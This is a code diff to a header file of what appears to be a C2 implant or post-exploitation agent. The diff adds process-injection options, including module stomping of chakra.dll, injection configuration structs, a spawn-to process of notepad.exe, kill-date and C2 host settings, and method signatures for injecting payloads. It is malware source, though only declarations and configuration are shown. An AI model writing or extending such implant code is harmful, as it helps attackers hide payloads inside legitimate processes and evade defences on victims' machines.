@@ -46,6 +46,9 @@ EXTERN_C UPTR EndPtr();
 #define PROFILE_SMB 0x15
 #define PROFILE_WEB 0x25
 
+#define INJECTION_STANDARD 0x10
+#define INJECTION_STOMPING 0x20
+
 #define KH_JOB_TERMINATE  0x010
 #define KH_JOB_READY_SEND 0x050
 #define KH_JOB_SUSPENDED  0x100
@@ -141,13 +144,13 @@ EXTERN_C UPTR EndPtr();
 #define PROFILE_C2 PROFILE_WEB
 #endif 
 
-#ifndef KH_INJECTION_PE 
-#define KH_INJECTION_PE PeReflection
-#endif // KH_INJECTION_PE
+#ifndef KH_STOMP_MODULE
+#define KH_STOMP_MODULE "chakra.dll"
+#endif 
 
-#ifndef KH_INJECTION_SC
-#define KH_INJECTION_SC ScClassic
-#endif // KH_INJECTION_SC
+#ifndef KH_INJECTION_ID
+#define KH_INJECTION_ID INJECTION_STANDARD
+#endif
 
 #ifndef KH_SPAWNTO_X64
 #define KH_SPAWNTO_X64 "C:\\Windows\\System32\\notepad.exe"
@@ -316,6 +319,13 @@ typedef struct {
     ULONG ChunkSize;
 
     struct {
+        ULONG TechniqueId;
+        CHAR* StompModule;
+        ULONG Allocation;
+        ULONG Writing;
+    } Injection;
+
+    struct {
         CHAR* Spawnto;
         CHAR* ForkPipe;
     } Postex;
@@ -427,8 +437,10 @@ namespace Root {
             ULONG ChunkSize;
 
             struct {
-                ULONG Write;
-                ULONG Alloc;
+                ULONG  TechniqueId;
+                WCHAR* StompModule;
+                ULONG  Allocation;
+                ULONG  Writing;
             } Injection;
 
             struct {
@@ -477,7 +489,6 @@ namespace Root {
                 INT16 Year;
             } KillDate;
 
-
             struct {
                 WCHAR** Host;
                 ULONG*  Port;
@@ -521,6 +532,7 @@ namespace Root {
             ULONG UsedRAM;
             ULONG TotalRAM;
             ULONG PercentRAM;
+            BOOL  CfgEnabled;
             BYTE  OsArch;
             ULONG OsMjrV;
             ULONG OsMnrV;
@@ -689,7 +701,9 @@ namespace Root {
             DECLAPI( GetFileSize );
             DECLAPI( FileTimeToSystemTime );
             DECLAPI( FindFirstFileA );
+            DECLAPI( FindFirstFileW );
             DECLAPI( FindNextFileA );
+            DECLAPI( FindNextFileW );
             DECLAPI( FindClose );
             DECLAPI( SetFileInformationByHandle );
         
@@ -810,7 +824,9 @@ namespace Root {
             RSL_TYPE( GetFileSize ),
             RSL_TYPE( FileTimeToSystemTime ),
             RSL_TYPE( FindFirstFileA ),
+            RSL_TYPE( FindFirstFileW ),
             RSL_TYPE( FindNextFileA ),
+            RSL_TYPE( FindNextFileW ),
             RSL_TYPE( FindClose ),
             RSL_TYPE( SetFileInformationByHandle ),
         
@@ -1166,7 +1182,7 @@ namespace Root {
             DECLAPI( InternetOpenW       );
             DECLAPI( InternetConnectW    );
             DECLAPI( HttpOpenRequestW    );
-	    DECLAPI( HttpAddRequestHeadersW );
+	        DECLAPI( HttpAddRequestHeadersW );
             DECLAPI( InternetSetOptionW  );
             DECLAPI( InternetSetCookieW  );
             DECLAPI( HttpSendRequestW    );
@@ -1177,7 +1193,7 @@ namespace Root {
             RSL_TYPE( InternetOpenW       ),
             RSL_TYPE( InternetConnectW    ),
             RSL_TYPE( HttpOpenRequestW    ),
-	    RSL_TYPE( HttpAddRequestHeadersW ),
+	        RSL_TYPE( HttpAddRequestHeadersW ),
             RSL_TYPE( InternetSetOptionW  ),
             RSL_TYPE( InternetSetCookieW  ),
             RSL_TYPE( HttpSendRequestW    ),
@@ -2245,6 +2261,14 @@ public:
         HANDLE   WriteHandle;
     } Node[15];
 
+    auto Main(
+        _In_    BYTE*    Buffer,
+        _In_    SIZE_T   Size,
+        _In_    BYTE*    ArgBuff,
+        _In_    SIZE_T   ArgSize,
+        _Inout_ INJ_OBJ* Object
+    ) -> BOOL;
+
     auto Stomp(
         _In_    BYTE*    Buffer,
         _In_    SIZE_T   Size,
@@ -2469,7 +2493,7 @@ public:
         _In_ PCHAR LibName
     ) -> UPTR;
 
-    auto GetRnd( VOID ) -> PCHAR;
+    auto DECLFN Library::GetRnd(  _Out_ WCHAR*& ModulePath ) -> BOOL;
 
     auto Map(
         _In_ PCHAR LibName
